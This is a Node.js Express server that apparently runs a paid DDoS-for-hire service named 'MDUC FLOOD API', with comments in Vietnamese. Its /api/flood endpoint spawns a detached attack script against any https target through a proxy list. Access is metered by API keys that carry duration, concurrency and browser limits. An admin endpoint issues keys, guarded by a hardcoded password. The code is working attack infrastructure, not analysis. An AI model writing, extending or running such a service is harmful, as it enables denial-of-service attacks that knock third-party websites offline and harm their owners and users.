const express = require("express");
const cors = require("cors");
const { spawn } = require("child_process");
const path = require("path");
const fs = require("fs-extra");
const os = require("os");

const app = express();
app.use(cors());
app.use(express.json());

const PORT = process.env.PORT || 8080;
const KEY_FILE = "apikey.json";
const PROXY_FILE = "proxy.txt";
const ADMIN_PASSWORD = "Mduc2007@"; 
const activeAttacks = new Map();

// Helper: Đọc và Ghi file Key
const getKeys = () => {
    if (!fs.existsSync(KEY_FILE)) fs.writeJsonSync(KEY_FILE, { keys: [] });
    return fs.readJsonSync(KEY_FILE).keys;
};
const saveKeys = (keys) => fs.writeJsonSync(KEY_FILE, { keys }, { spaces: 2 });

// Reset lượt dùng mỗi ngày
function resetDailyUsage(keyData) {
    const today = new Date().toISOString().split('T')[0];
    if (keyData.last_reset_date !== today) {
        keyData.usage_today = 0;
        keyData.last_reset_date = today;
        return true;
    }
    return false;
}

// ==================== ENDPOINT TẤN CÔNG ====================
app.get("/api/flood", (req, res) => {
    let { key, target, time, threads, ratelimit, options } = req.query;

    let keys = getKeys();
    let keyIdx = keys.findIndex(k => k.key === key);
    if (keyIdx === -1) return res.status(403).json({ status: "error", msg: "Invalid API Key" });

    let keyData = keys[keyIdx];
    resetDailyUsage(keyData);

    // Kiểm tra giới hạn
    if (!target || !target.startsWith("https://")) return res.json({ status: "error", msg: "Target must start with https://" });
    if (parseInt(time) > keyData.max_duration) return res.json({ status: "error", msg: `Max duration is ${keyData.max_duration}s` });
    
    let currentRunning = Array.from(activeAttacks.values()).filter(a => a.key === key).length;
    if (currentRunning >= keyData.max_concurrent) return res.json({ status: "error", msg: "Concurrent limit reached" });
    if (keyData.usage_today >= keyData.daily_limit) return res.json({ status: "error", msg: "Daily limit reached" });

    // Xử lý Options và Giới hạn Browser
    let rawOptions = options ? options.split(" ") : [];
    let finalOptions = [];
    for (let i = 0; i < rawOptions.length; i++) {
        let opt = rawOptions[i];
        if (opt.startsWith("--") && keyData.allowed_options.includes(opt)) {
            if (opt === "--browser") {
                let count = parseInt(rawOptions[i + 1]);
                if (!isNaN(count)) {
                    finalOptions.push("--browser", Math.min(count, keyData.max_browsers).toString());
                    i++; continue;
                }
            }
            finalOptions.push(opt);
        }
    }

    const scriptPath = path.join(__dirname, "script.js");
    const cmdArgs = [scriptPath, target, time, threads, ratelimit, PROXY_FILE, ...finalOptions];

    const child = spawn("node", cmdArgs, { detached: true, stdio: 'ignore' });
    const attackId = `mduc_${Date.now()}`;

    activeAttacks.set(attackId, { process: child, key, target });
    keyData.usage_today += 1;
    saveKeys(keys);

    child.on("close", () => activeAttacks.delete(attackId));

    res.json({
        status: "success",
        msg: "MDUC-FLOOD attack started",
        data: { attackId, target, options: finalOptions.join(" ") }
    });
});

// ==================== QUẢN LÝ ADMIN ====================
app.post("/api/admin/addkey", (req, res) => {
    const { admin_pass, new_key, owner, max_duration, max_threads, daily_limit, max_concurrent, allowed_options, max_browsers } = req.body;
    if (admin_pass !== ADMIN_PASSWORD) return res.status(401).json({ status: "error", msg: "Unauthorized" });

    let keys = getKeys();
    const keyTemplate = {
        key: new_key,
        owner: owner || "User",
        max_duration: max_duration || 60,
        max_threads: max_threads || 20,
        daily_limit: daily_limit || 10,
        max_concurrent: max_concurrent || 1,
        max_browsers: max_browsers || 2,
        allowed_options: allowed_options || ["--randpath"],
        usage_today: 0,
        last_reset_date: new Date().toISOString().split('T')[0]
    };
    keys.push(keyTemplate);
    saveKeys(keys);
    res.json({ status: "success", msg: "Key created", key: keyTemplate });
});

app.get("/api/status", (req, res) => {
    res.json({
        service: "MDUC FLOOD API",
        active_attacks: activeAttacks.size,
        system: { cpu: os.loadavg()[0].toFixed(2), ram: (os.freemem() / 1024 / 1024 / 1024).toFixed(2) + " GB Free" }
    });
});

app.listen(PORT, () => console.log(`🚀 API Server is running on port ${PORT}`));
